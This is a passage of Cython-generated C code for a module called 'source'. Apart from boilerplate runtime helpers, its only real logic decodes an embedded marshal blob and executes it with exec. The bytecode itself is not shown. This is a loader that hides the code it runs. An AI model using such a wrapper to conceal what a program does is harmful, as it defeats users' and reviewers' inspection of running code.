    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_marshal, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_marshal, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_marshal); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_loads); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyExecGlobals(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_2) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* GetAttr */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {
#if CYTHON_USE_TYPE_SLOTS
#if PY_MAJOR_VERSION >= 3
    if (likely(PyUnicode_Check(n)))
#else
    if (likely(PyString_Check(n)))
#endif
        return __Pyx_PyObject_GetAttrStr(o, n);
#endif
    return PyObject_GetAttr(o, n);
}

/* Globals */
static PyObject* __Pyx_Globals(void) {
    Py_ssize_t i;
    PyObject *names;
    PyObject *globals = __pyx_d;
    Py_INCREF(globals);
    names = PyObject_Dir(__pyx_m);
    if (!names)
        goto bad;
    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject* name = PySequence_ITEM(names, i);
        if (!name)
            goto bad;
#else
        PyObject* name = PyList_GET_ITEM(names, i);
#endif
        if (!PyDict_Contains(globals, name)) {
            PyObject* value = __Pyx_GetAttr(__pyx_m, name);
            if (!value) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                goto bad;
            }
            if (PyDict_SetItem(globals, name, value) < 0) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                Py_DECREF(value);
                goto bad;
            }
        }
#if CYTHON_COMPILING_IN_PYPY
        Py_DECREF(name);
#endif
    }
    Py_DECREF(names);
    return globals;
bad:
    Py_XDECREF(names);
    Py_XDECREF(globals);
    return NULL;
}

/* PyExec */
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {
    return __Pyx_PyExec3(o, globals, NULL);
}
static PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {
    PyObject* result;
    PyObject* s = 0;
    char *code = 0;
    if (!globals || globals == Py_None) {
        globals = __pyx_d;
    } else if (!PyDict_Check(globals)) {
        PyErr_Format(PyExc_TypeError, "exec() arg 2 must be a dict, not %.200s",
                     Py_TYPE(globals)->tp_name);
        goto bad;
    }
    if (!locals || locals == Py_None) {
        locals = globals;
    }
    if (__Pyx_PyDict_GetItemStr(globals, __pyx_n_s_builtins) == NULL) {
        if (PyDict_SetItem(globals, __pyx_n_s_builtins, PyEval_GetBuiltins()) < 0)
            goto bad;
    }
    if (PyCode_Check(o)) {
        if (__Pyx_PyCode_HasFreeVars((PyCodeObject *)o)) {
            PyErr_SetString(PyExc_TypeError,
                "code object passed to exec() may not contain free variables");
            goto bad;
        }
        #if PY_VERSION_HEX < 0x030200B1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM < 0x07030400)
        result = PyEval_EvalCode((PyCodeObject *)o, globals, locals);
        #else
        result = PyEval_EvalCode(o, globals, locals);
        #endif
    } else {
        PyCompilerFlags cf;
        cf.cf_flags = 0;
#if PY_VERSION_HEX >= 0x030800A3
        cf.cf_feature_version = PY_MINOR_VERSION;
#endif
        if (PyUnicode_Check(o)) {
            cf.cf_flags = PyCF_SOURCE_IS_UTF8;
            s = PyUnicode_AsUTF8String(o);
            if (!s) goto bad;
            o = s;
        #if PY_MAJOR_VERSION >= 3
        } else if (!PyBytes_Check(o)) {
        #else
        } else if (!PyString_Check(o)) {
        #endif
            PyErr_Format(PyExc_TypeError,
                "exec: arg 1 must be string, bytes or code object, got %.200s",
                Py_TYPE(o)->tp_name);
            goto bad;
        }
        #if PY_MAJOR_VERSION >= 3
        code = PyBytes_AS_STRING(o);
        #else
        code = PyString_AS_STRING(o);
        #endif
        if (PyEval_MergeCompilerFlags(&cf)) {
            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);
        } else {
            result = PyRun_String(code, Py_file_input, globals, locals);
        }
        Py_XDECREF(s);
    }
    return result;
bad:
    Py_XDECREF(s);
    return 0;
}

/* PyExecGlobals */
static PyObject* __Pyx_PyExecGlobals(PyObject* code) {
    PyObject* result;
    PyObject* globals = __Pyx_Globals();
    if (unlikely(!globals))
        return NULL;
    result = __Pyx_PyExec2(code, globals);
    Py_DECREF(globals);
    return result;
}

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
